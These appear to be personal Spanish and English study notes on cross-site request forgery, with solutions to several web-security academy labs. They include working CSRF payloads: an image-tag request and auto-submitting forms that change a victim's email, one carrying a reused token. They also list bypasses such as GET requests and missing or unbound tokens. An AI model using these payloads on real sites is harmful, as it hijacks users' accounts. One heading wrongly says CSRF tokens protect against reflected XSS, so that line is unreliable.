# Cross-site request forgery (CSRF)

> Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy,
>  which is designed to prevent different websites from interfering with each other.


## What are CSRF tokens?

> A CSRF token is a unique, secret, unpredictable value that is generated by the server-side application and transmitted to the client in such a way that it is included in a subsequent HTTP request made by the client. When the later request is made, 
> the server-side application validates that the request includes the expected token and rejects the request if the token is missing or invalid.

***Puede ayudar a proteger contra XSS reflejados*** porque:

> CSRF tokens can prevent CSRF attacks by making it impossible for an attacker to construct a fully valid HTTP request suitable for feeding to a victim user. 
Since the attacker cannot determine or predict the value of a user's CSRF token, they cannot construct a request with all the parameters that are necessary for the application to honor the request.


## How should CSRF tokens be validated?

> When a CSRF token is generated, it should be stored server-side within the user's session data. When a subsequent request is received that requires validation, the server-side application should verify that the request includes a token which matches the value that was stored in the user's session. This validation must be performed regardless of the HTTP method or content type of the request. If the request does not contain any token at all, it should be rejected in the same way as when an invalid token is present.

## Como atacar 

> The delivery mechanisms for cross-site request forgery attacks are essentially the same as for reflected XSS. Typically, the attacker will place the malicious HTML onto a web site that they control, and then induce victims to visit that web site. This might be done by feeding the user a link to the web site, via an email or social media message. Or if the attack is placed into a popular web site (for example, in a user comment), they might just wait for users to visit the web site.

Por ejemplo:

```
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">

```

Algunas ocaciones la aplicacion valida el TOKEN cuando se hace una peticion POST pero ***NO valida cuando se realiza una peticion GET***
Otras ocaciones la aplicaciones permiten hacer cosas sin el token asi que hay que probar.
Tambien otra vulnerabilidad es que la app usa un pool de tokens entonces tu podrias crearte un usuario obtener un token valido e intentar usarlo para otros usuarios.
Otro vector de ataque es que se asigna un token en base a la cookie.

> This situation is harder to exploit but is still vulnerable. If the web site contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible. The attacker can log in to the application using their own account, obtain a valid token and associated cookie, leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.

# Labs

##  CSRF vulnerability with no defenses

Para este lab no se tiene defensas entonces con que la victima de click en un codigo como este:

```

<form method="POST" action="https://0a0d00b604a855c2c086536600b800d8.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="a1&#64;test&#46;com">
</form>
<script>
        document.forms[0].submit();
</script>

```

Se estaria cambiando su email.

## CSRF where token validation depends on request method

Para este ejemplo si cuenta la app con proteccion pero solo para el metodo post pero si lo intentas por el metodo GET si cambia el email aqui el ejemplo

```
<form method="GET" action="https://0a1f006e03d8dd12c0fe542800c400ba.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="a1&#64;test&#46;com">
</form>
<script>
        document.forms[0].submit();
</script>

```

## CSRF where token validation depends on token being present

En este caso si ves burp cuando se realiza la peticion y modificas el toquen CSRF no realiza la peticion pero si se lo quitas completamente entonces si
cambia.


```
Mismo codigo que la peticion POST(arriba)
```

## CSRF where token is not tied to user session

En este caso el token CSRF no se tiene alineado con una sesion si no que mientras sea un token valido aplica para cualquier cookie
para llevar acabo el ataque se debe de interceptar el token cuando se va a cambiar el email en este caso el tuyo de tu cuenta 
que tienes control y posteriormente generar el ataque:

```
<form method="POST" action="https://0a5700ee037a2cddc05e1e0900a6006e.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="a1&#64;test&#46;com"> 
    <input type="hidden" name="csrf" value="eqbRsc6Ot2hIrzUbUZUYn6CEvoHBLAJ3">
</form>
<script>
        document.forms[0].submit();
</script>


```


NOTA: Se puede utilizar la herramienta "csrf-poc-generator-master" para generar un poc de una peticion genera un script parecido.

